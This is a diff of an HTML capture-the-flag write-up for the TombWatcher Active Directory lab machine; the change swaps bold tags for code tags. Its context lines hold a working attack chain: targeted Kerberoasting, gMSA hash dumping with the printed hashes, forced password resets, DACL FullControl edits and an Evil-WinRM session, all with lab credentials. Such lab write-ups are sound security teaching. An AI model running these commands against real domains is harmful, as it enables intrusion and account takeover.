@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>TombWatcher is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack leverages <strong>WriteSPN</strong> rights for a Targeted Kerberoast, then chains through <strong>gMSA password dumping</strong>, <strong>WriteOwner abuse</strong>, and <strong>AD tombstone (deleted object) restoration</strong> to recover a deleted cert_admin account. The final escalation uses <strong>certipy</strong> to request a certificate as Administrator and obtain an LDAP shell.</p>
+      <p>TombWatcher is a Medium difficulty Windows AD machine. Starting with provided credentials, the attack leverages <code>WriteSPN</code> rights for a Targeted Kerberoast, then chains through <code>gMSA password dumping</code>, <code>WriteOwner abuse</code>, and <code>AD tombstone (deleted object) restoration</code> to recover a deleted cert_admin account. The final escalation uses <code>certipy</code> to request a certificate as Administrator and obtain an LDAP shell.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan. This is an assumed-breach scenario with credentials: <code>henry / H3nry_987TGV!</code>.</p>
@@ -271,7 +271,7 @@ Nmap done: 1 IP address (1 host up) scanned in 88.97 seconds
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections</code></pre></div>
       <h3 class="writeup-sub-title">BloodHound Analysis</h3>
-      <p>I collect LDAP data and analyze it in BloodHound. The user <code>henry</code> has <strong>WriteSPN</strong> rights over user <code>Alfred</code> — enabling a Targeted Kerberoast attack.</p>
+      <p>I collect LDAP data and analyze it in BloodHound. The user <code>henry</code> has <code>WriteSPN</code> rights over user <code>Alfred</code> — enabling a Targeted Kerberoast attack.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.244.237 -u &#x27;henry&#x27; -p &#x27;H3nry_987TGV!&#x27; --bloodhound --collection All --dns-server 10.129.244.237
 SMB         10.129.244.237  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
 LDAP        10.129.244.237  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
@@ -280,7 +280,7 @@ LDAP        10.129.244.237  389    DC01             Done in 00M 03S
 LDAP        10.129.244.237  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.244.237_2025-06-08_050257_bloodhound.zip</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250607214016.png" alt="WriteSPN relationship from henry to Alfred" loading="lazy" /><span class="img-caption">WriteSPN relationship from henry to Alfred</span></div>
       <h2 class="writeup-section-title">Foothold: Targeted Kerberoast</h2>
-      <p><strong>Targeted Kerberoasting</strong> works by first setting an SPN on a target account (using WriteSPN), then requesting a Kerberos service ticket for that SPN. The ticket is encrypted with the target account's password hash, which can be cracked offline.</p>
+      <p><code>Targeted Kerberoasting</code> works by first setting an SPN on a target account (using WriteSPN), then requesting a Kerberos service ticket for that SPN. The ticket is encrypted with the target account's password hash, which can be cracked offline.</p>
       <div class="code-block"><pre><code>python3 targetedKerberoast.py -v -d &#x27;tombwatcher.htb&#x27; -u henry -p &#x27;H3nry_987TGV!&#x27;
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
@@ -300,12 +300,12 @@ Use the &quot;--show&quot; option to display all of the cracked passwords reliab
 Session completed.</code></pre></div>
       <h2 class="writeup-section-title">Lateral Movement: gMSA & WriteOwner Chain</h2>
       <h3 class="writeup-sub-title">Adding to IT_SUPPORT Group</h3>
-      <p>In BloodHound, Alfred can add himself to a group that has <strong>ReadGMSAPassword</strong> permissions on the <code>Ansible_Dev$</code> service account.</p>
+      <p>In BloodHound, Alfred can add himself to a group that has <code>ReadGMSAPassword</code> permissions on the <code>Ansible_Dev$</code> service account.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;Alfred&#x27; -p &#x27;basketball&#x27; -d tombwatcher.htb add groupMember &quot;Infrastructure&quot; Alfred 
 [+] Alfred added to Infrastructure</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250607221941.png" alt="ReadGMSAPassword permission on Ansible_Dev$" loading="lazy" /><span class="img-caption">ReadGMSAPassword permission on Ansible_Dev$</span></div>
       <h3 class="writeup-sub-title">gMSA Password Dump</h3>
-      <p><strong>gMSA</strong> (Group Managed Service Account) is a special AD account whose password is automatically managed by the domain. If you have <strong>ReadGMSAPassword</strong> rights, you can extract its NTLM hash. I use <code>gMSADumper.py</code> to do this.</p>
+      <p><code>gMSA</code> (Group Managed Service Account) is a special AD account whose password is automatically managed by the domain. If you have <code>ReadGMSAPassword</code> rights, you can extract its NTLM hash. I use <code>gMSADumper.py</code> to do this.</p>
       <div class="code-block"><pre><code>python3 gMSADumper.py -u Alfred -p basketball -d tombwatcher.htb
 Users or groups who can read password for ansible_dev$:
  &gt; Infrastructure
@@ -313,7 +313,7 @@ ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
 ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
 ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a</code></pre></div>
       <h3 class="writeup-sub-title">Password Changes: Sam → John</h3>
-      <p>BloodHound shows <code>ansible_dev$</code> can change <code>Sam</code>'s password (ForceChangePassword). Sam has <strong>WriteOwner</strong> rights over <code>John</code>. I chain these: change Sam's password, take ownership of John, grant FullControl, then change John's password.</p>
+      <p>BloodHound shows <code>ansible_dev$</code> can change <code>Sam</code>'s password (ForceChangePassword). Sam has <code>WriteOwner</code> rights over <code>John</code>. I chain these: change Sam's password, take ownership of John, grant FullControl, then change John's password.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;ansible_dev$&#x27; -p &quot;:1c37d00093dc2a5f25176bf2d474afdc&quot; -d tombwatcher.htb --dc-ip 10.129.244.12 set password Sam Test123   
 [+] Password changed successfully!</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250607230159.png" alt="WriteOwner from Sam to John" loading="lazy" /><span class="img-caption">WriteOwner from Sam to John</span></div>
@@ -325,14 +325,14 @@ ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a</code></pr
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
 [*] OwnerSid modified successfully!</code></pre></div>
-      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <strong>FullControl</strong> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
+      <p>I use <code>dacledit.py</code> to modify the DACL (Discretionary Access Control List) of the target AD object, granting our controlled account <code>FullControl</code> permissions. FullControl is the most permissive right in Active Directory — it allows reading/writing all properties, changing permissions, deleting the object, and performing any operation on it. With this level of access, I can change the target's password, modify group memberships, or add Shadow Credentials.</p>
       <div class="code-block"><pre><code>dacledit.py -action &#x27;write&#x27; -rights &#x27;FullControl&#x27; -principal &#x27;Sam&#x27; -target &#x27;John&#x27; &#x27;tombwatcher.htb&#x27;/&#x27;Sam&#x27;:&#x27;Test123&#x27;
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] DACL backed up to dacledit-20250608-025440.bak
 [*] DACL modified successfully!</code></pre></div>
-      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <p>I use <code>bloodyAD</code> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>bloodyAD --host dc01.tombwatcher.htb -u &#x27;Sam&#x27; -p &quot;Test123&quot; -d tombwatcher.htb --dc-ip 10.129.111.103 set password John Test123</code></pre></div>
       <h3 class="writeup-sub-title">User Flag</h3>
       <p>I connect as John via Evil-WinRM and read the user flag.</p>
@@ -340,7 +340,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
                                  
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\john\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\john\Desktop&gt; ls
 
 
@@ -357,7 +357,7 @@ cc6d7526229f416110d93d74f2a750ee</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">cc6d7526229f416110d93d74f2a750ee</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: AD Tombstone & Certificate Abuse</h2>
       <h3 class="writeup-sub-title">Restoring Deleted AD Objects</h3>
-      <p>John has <strong>GenericAll</strong> rights over the AD Recycle Bin. The <strong>AD Tombstone</strong> feature allows querying and restoring deleted objects. I search for deleted user accounts.</p>
+      <p>John has <code>GenericAll</code> rights over the AD Recycle Bin. The <code>AD Tombstone</code> feature allows querying and restoring deleted objects. I search for deleted user accounts.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\john\Documents&gt; Get-ADObject -Filter &#x27;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#x27; -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
 
 
